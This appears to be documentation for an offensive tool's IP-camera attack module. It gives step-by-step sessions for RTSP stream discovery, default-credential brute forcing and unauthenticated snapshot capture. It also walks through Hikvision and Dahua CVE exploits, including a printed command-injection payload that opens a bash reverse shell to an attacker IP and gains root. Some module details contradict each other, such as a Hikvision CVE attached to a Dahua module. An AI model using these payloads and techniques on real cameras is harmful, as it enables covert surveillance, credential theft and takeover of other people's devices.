# RTSP Camera Engine

**Language:** English (en-US) | **pt-BR:** [../pt-BR/21-rtsp-camera-engine.md](../pt-BR/21-rtsp-camera-engine.md)

---

## Overview

EmbedXPL-Forge includes a full RTSP/IP-camera attack engine covering:

- **Route discovery:** Enumerate live RTSP streams and guess valid stream paths (based on cameradar's route dictionary)
- **Credential testing:** Brute-force RTSP Basic authentication with the built-in credential dictionary
- **Snapshot capture:** Test unauthenticated snapshot access on 30+ endpoints
- **Vendor-specific exploits:** CVE-specific modules for Hikvision, Dahua, Axis, Reolink, MVPOWER, Uniview, and others
- **NSE integration:** `embedxpl-rtsp-discover`, `embedxpl-camera-identify`, `embedxpl-camera-snapshot`, `embedxpl-rtsp-creds`, `embedxpl-hikvision-vuln`, `embedxpl-dahua-vuln`

---

## RTSP port reference

| Port | Description |
|------|-------------|
| `554` | Standard RTSP (primary) |
| `5554` | Alternate RTSP |
| `8554` | Alternate RTSP (many IoT cameras) |
| `37777` | Dahua DVR/NVR proprietary |
| `34567` | HiSilicon/Xiongmai DVR |
| `8080` | HTTP RTSP proxy |
| `7447` | RTSP-over-HTTP tunneling |

---

## Scanner module: `scanners/cameras/rtsp_discover`

### Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptString` | `""` | IP address, CIDR, or IP range (e.g. `192.168.1.0/24`) |
| `ports` | `OptString` | `554,5554,8554` | Comma-separated RTSP ports to scan |
| `extended_ports` | `OptBool` | `false` | Add extended port set (15 ports) |
| `scan_method` | `OptString` | `socket` | `socket`, `nmap`, or `masscan` |
| `timeout` | `OptInt` | `3` | Per-host TCP probe timeout |
| `threads` | `OptInt` | `50` | Concurrent scan threads |

### Scan + route discovery — I/O session

```
exf> use scanners/cameras/rtsp_discover
exf (cameras/rtsp_discover) > set target 192.168.1.0/24
[+] target => 192.168.1.0/24
exf (cameras/rtsp_discover) > set extended_ports true
[+] extended_ports => true
exf (cameras/rtsp_discover) > run

[*] Running module embedxpl.modules.scanners.cameras.rtsp_discover...
[*] Scanning 192.168.1.0/24 for RTSP services on ports: 554,5554,8554,8080,37777,...
[*] Thread pool: 50 workers
[*] Probing 256 hosts...

[+] RTSP services found: 4

┌─────────────────┬───────┬────────────────────────────────────────────────────────────────┐
│ Host            │ Port  │ Banner / Fingerprint                                            │
├─────────────────┼───────┼────────────────────────────────────────────────────────────────┤
│ 192.168.1.100   │  554  │ RTSP/1.0 401 Unauthorized — Hikvision DS-2CD2143G2-I           │
│ 192.168.1.101   │  554  │ RTSP/1.0 401 Unauthorized — Dahua IPC-HDW2831T                 │
│ 192.168.1.110   │ 8554  │ RTSP/1.0 200 OK — stream available (no auth)                   │
│ 192.168.1.120   │ 37777 │ RTSP/1.0 401 Unauthorized — Dahua DVR                          │
└─────────────────┴───────┴────────────────────────────────────────────────────────────────┘

[*] Discovering stream routes...
  192.168.1.100 (Hikvision): trying /Streaming/Channels/101... [401]
                              trying /h264/ch1/main/av_stream... [200] FOUND
                              trying /ch1/main/av_stream... [401]
  192.168.1.101 (Dahua):     trying /cam/realmonitor?channel=1&subtype=0... [200] FOUND
  192.168.1.110 (unknown):   trying /... [200] FOUND
  192.168.1.120 (Dahua DVR): trying /cam/realmonitor?channel=1&subtype=0... [200] FOUND

[+] Stream routes discovered:
  rtsp://192.168.1.100:554/h264/ch1/main/av_stream   -- Hikvision (auth required)
  rtsp://192.168.1.101:554/cam/realmonitor?channel=1&subtype=0  -- Dahua (auth required)
  rtsp://192.168.1.110:8554/                         -- Unknown (no auth)
  rtsp://192.168.1.120:37777/cam/realmonitor?channel=1&subtype=0  -- Dahua DVR (auth required)
```

---

## Credential testing: `exploits/cameras/multi/rtsp_credential_brute`

### Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | Camera IP address |
| `port` | `OptPort` | `554` | RTSP port |
| `route` | `OptString` | `/` | RTSP stream route (discovered via route discovery) |
| `username_list` | `OptString` | `built-in` | Path to username wordlist (empty = built-in) |
| `password_list` | `OptString` | `built-in` | Path to password wordlist (empty = built-in) |
| `threads` | `OptInt` | `4` | Concurrent credential threads |
| `timeout` | `OptInt` | `3` | Per-attempt timeout |

### Built-in credential dictionary

The built-in list covers default credentials for Hikvision, Dahua, Axis, Reolink, Hanwha, Vivotek, Bosch, and generic IoT cameras. 250+ username/password pairs.

### Credential testing — I/O session

```
exf> use exploits/cameras/multi/rtsp_credential_brute
exf (cameras/rtsp_credential_brute) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (cameras/rtsp_credential_brute) > set port 554
[+] port => 554
exf (cameras/rtsp_credential_brute) > set route /h264/ch1/main/av_stream
[+] route => /h264/ch1/main/av_stream
exf (cameras/rtsp_credential_brute) > run

[*] Running RTSP credential brute force: 192.168.1.100:554
[*] Testing 250 credential pairs...
[-] admin:admin          [401]
[-] admin:12345          [401]
[-] admin:password       [401]
[+] admin:hik12345       [200] VALID CREDENTIALS FOUND
[+] Stream available at: rtsp://admin:hik12345@192.168.1.100:554/h264/ch1/main/av_stream
[*] Play with: vlc rtsp://admin:hik12345@192.168.1.100:554/h264/ch1/main/av_stream
             : ffplay rtsp://admin:hik12345@192.168.1.100:554/h264/ch1/main/av_stream
```

### No credentials found

```
[*] Tested 250 credential pairs — no valid credentials found
[*] Device may use non-standard credentials. Try: set username_list /path/to/custom.txt
```

---

## Snapshot access: `exploits/cameras/multi/unauthenticated_snapshot`

Tests 30+ known unauthenticated JPEG snapshot endpoints across all major camera vendors.

### Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | Camera IP |
| `port` | `OptPort` | `80` | HTTP port |
| `ssl` | `OptBool` | `false` | Use HTTPS |
| `save_path` | `OptString` | `""` | Save captured snapshots to directory |
| `timeout` | `OptInt` | `5` | HTTP request timeout |

### Snapshot access — I/O session

```
exf> use exploits/cameras/multi/unauthenticated_snapshot
exf (cameras/unauthenticated_snapshot) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (cameras/unauthenticated_snapshot) > set save_path /tmp/snapshots
[+] save_path => /tmp/snapshots
exf (cameras/unauthenticated_snapshot) > run

[*] Testing 32 unauthenticated snapshot endpoints on 192.168.1.100:80...
[-] /onvif-http/snapshot                [401 Unauthorized]
[-] /Streaming/channels/1/picture       [401 Unauthorized]
[+] /ISAPI/Streaming/channels/1/picture [200 OK] -- JPEG 1920x1080 (saved: /tmp/snapshots/192.168.1.100_1.jpg)
[+] /snapshot.cgi                       [200 OK] -- JPEG 1280x720 (saved: /tmp/snapshots/192.168.1.100_2.jpg)
[-] /cgi-bin/snapshot.cgi               [404 Not Found]
...

[+] 2 unauthenticated snapshot endpoint(s) found:
  http://192.168.1.100/ISAPI/Streaming/channels/1/picture
  http://192.168.1.100/snapshot.cgi
[*] Snapshots saved to: /tmp/snapshots/
```

---

## Hikvision modules

### `exploits/cameras/hikvision/rtsp_rce_cve_2021_36260`

**CVE-2021-36260** — Unauthenticated command injection via RTSP (CVSS 9.8)

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | Hikvision camera/NVR IP |
| `port` | `OptPort` | `80` | HTTP management port |
| `lhost` | `OptIP` | `""` | Attacker IP for reverse shell |
| `lport` | `OptPort` | `4444` | Listener port |
| `shell_type` | `OptString` | `auto` | Shell type |

```
exf> use exploits/cameras/hikvision/rtsp_rce_cve_2021_36260
exf (hikvision/rtsp_rce_cve_2021_36260) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (hikvision/rtsp_rce_cve_2021_36260) > set lhost 10.10.14.22
[+] lhost => 10.10.14.22
exf (hikvision/rtsp_rce_cve_2021_36260) > check

[*] Sending probe to http://192.168.1.100/SDK/webLanguage...
[+] Target is vulnerable (CVE-2021-36260) — response contains command injection indicator

exf (hikvision/rtsp_rce_cve_2021_36260) > run

[*] Exploiting CVE-2021-36260 — command injection via /SDK/webLanguage XML endpoint
[*] Payload: <?xml version="1.0" encoding="UTF-8"?><language>$(bash -i >& /dev/tcp/10.10.14.22/4444 0>&1)</language>
[*] Sending PUT /SDK/webLanguage HTTP/1.1 ...
[*] Listening on 0.0.0.0:4444 (timeout: 60s)...
[+] Connection received from 192.168.1.100:38201
[*] PTY upgrade: python3 -c "import pty; pty.spawn('/bin/sh')"

$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /proc/version
Linux version 3.18.29 (huawei@xx) (gcc version 4.8.3)
```

Affected firmware: Hikvision IP cameras, NVRs, and DVRs with firmware < V5.5.800.

---

### `exploits/cameras/hikvision/info_disclosure_cve_2017_7921`

**CVE-2017-7921** — Authentication bypass via snapshot/password endpoints (CVSS 8.8)

```
exf> use exploits/cameras/hikvision/info_disclosure_cve_2017_7921
exf (hikvision/info_disclosure_cve_2017_7921) > set target 192.168.1.100
[+] target => 192.168.1.100
exf (hikvision/info_disclosure_cve_2017_7921) > run

[*] Testing CVE-2017-7921 authentication bypass...
[*] GET /Security/users?auth=YWRtaW46MTETC...
[+] Authentication bypassed — user list:
    admin : admin123
    operator : op456
[*] GET /onvif-http/snapshot?auth=YWRtaW46MTETC...
[+] Snapshot accessible without credentials (saved)
```

---

## Dahua modules

### `exploits/cameras/dahua/auth_bypass_cve_2021_33044`

**CVE-2021-33044** — Authentication bypass via direct session token (CVSS 9.8)

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `target` | `OptIP` | `""` | Dahua camera/NVR/DVR IP |
| `port` | `OptPort` | `80` | HTTP management port |

```
exf> use exploits/cameras/dahua/auth_bypass_cve_2021_33044
exf (dahua/auth_bypass_cve_2021_33044) > set target 192.168.1.101
[+] target => 192.168.1.101
exf (dahua/auth_bypass_cve_2021_33044) > check

[*] Probing 192.168.1.101 for CVE-2021-33044...
[+] Target is vulnerable — /RPC2 endpoint responds to forged session token

exf (dahua/auth_bypass_cve_2021_33044) > run

[*] Sending forged session request to /RPC2...
[+] Authentication bypassed — session token obtained
[+] Device info:
    Model      : IPC-HDW2831T-AS
    Firmware   : V2.820.0000006.0.R
    Serial     : 4A0C5B2F3...
[+] Admin credentials: admin : dahua1234
[*] Full management access obtained
```

---

### `exploits/cameras/dahua/cctv_username_disclosure_cve_2020_25078`

**CVE-2020-25078** — Unauthenticated username enumeration

```
exf> use exploits/cameras/dahua/cctv_username_disclosure_cve_2020_25078
exf (dahua/cctv_username_disclosure_cve_2020_25078) > set target 192.168.1.101
[+] target => 192.168.1.101
exf (dahua/cctv_username_disclosure_cve_2020_25078) > run

[*] GET /cgi-bin/global.cgi?action=getData&name=Account...
[+] Users disclosed:
    admin  (level: 3 - Administrator)
    user1  (level: 1 - Operator)
    viewer (level: 0 - View-Only)
```

---

## NSE scripts for cameras

See [12-nse-script-manager.md](12-nse-script-manager.md) for full installation steps. Quick usage:

```bash
# Discover RTSP services + banner
nmap -sV -p 554,5554,8554 --script embedxpl-rtsp-discover 192.168.1.0/24

# Deep camera fingerprinting (HTTP + RTSP + ONVIF)
nmap -sV -p 80,443,554 --script embedxpl-camera-identify 192.168.1.100

# Test unauthenticated snapshot access (30+ endpoints)
nmap -p 80,8080,443 --script embedxpl-camera-snapshot 192.168.1.0/24

# RTSP default credential check
nmap -p 554,5554 --script embedxpl-rtsp-creds 192.168.1.0/24

# Hikvision CVE check (CVE-2021-36260 + CVE-2017-7921)
nmap -p 80,443 --script embedxpl-hikvision-vuln 192.168.1.100

# Dahua CVE check (CVE-2021-33044 + CVE-2020-25078 + CVE-2013-6117)
nmap -p 80,37777 --script embedxpl-dahua-vuln 192.168.1.101

# All camera scripts
nmap -sV -p 80,443,554,5554,8554,37777 --script 'embedxpl-*' 192.168.1.0/24
```

---

## Camera exploit module index

| Module path | Vendor | CVE | CVSS | Description |
|-------------|--------|-----|------|-------------|
| `exploits/cameras/hikvision/rtsp_rce_cve_2021_36260` | Hikvision | CVE-2021-36260 | 9.8 | Unauthenticated RCE via command injection |
| `exploits/cameras/hikvision/info_disclosure_cve_2017_7921` | Hikvision | CVE-2017-7921 | 8.8 | Auth bypass — user/password disclosure |
| `exploits/cameras/hikvision/psh_command_injection` | Hikvision | N/A | 8.0 | PSH protocol command injection |
| `exploits/cameras/hikvision/psh_debug_rsa1024_bypass` | Hikvision | N/A | 7.5 | PSH debug RSA1024 authentication bypass |
| `exploits/cameras/hikvision/psh_challenge_predictor` | Hikvision | N/A | 7.5 | PSH challenge/response predictor |
| `exploits/cameras/hikvision/nas_auth_bypass_cve_2023_28808` | Hikvision | CVE-2023-28808 | 9.1 | NAS auth bypass |
| `exploits/cameras/hikvision/firmware_crypto_key_extract` | Hikvision | N/A | 6.5 | Firmware encryption key extraction |
| `exploits/cameras/hikvision/nvr_dvr_serial_privesc` | Hikvision | N/A | 7.8 | NVR/DVR serial privilege escalation |
| `exploits/cameras/dahua/auth_bypass_cve_2021_33044` | Dahua | CVE-2021-33044 | 9.8 | Authentication bypass |
| `exploits/cameras/dahua/cctv_auth_bypass_cve_2021_33044` | Dahua | CVE-2021-33044 | 9.8 | CCTV auth bypass variant |
| `exploits/cameras/dahua/cctv_rce_cve_2021_36260` | Dahua | CVE-2021-36260 | 9.8 | CCTV RCE |
| `exploits/cameras/dahua/cctv_username_disclosure_cve_2020_25078` | Dahua | CVE-2020-25078 | 7.5 | Unauthenticated username disclosure |
| `exploits/cameras/dahua/dvr_auth_bypass_cve_2013_6117` | Dahua | CVE-2013-6117 | 7.5 | DVR authentication bypass |
| `exploits/cameras/dahua/cctv_37777_credential_extraction` | Dahua | N/A | 7.5 | Port 37777 credential extraction |
| `exploits/cameras/dahua/cctv_firmware_upload_no_verify` | Dahua | N/A | 8.0 | Unsigned firmware upload |
| `exploits/cameras/dahua/cctv_pem_key_extraction` | Dahua | N/A | 6.5 | PEM key extraction from firmware |
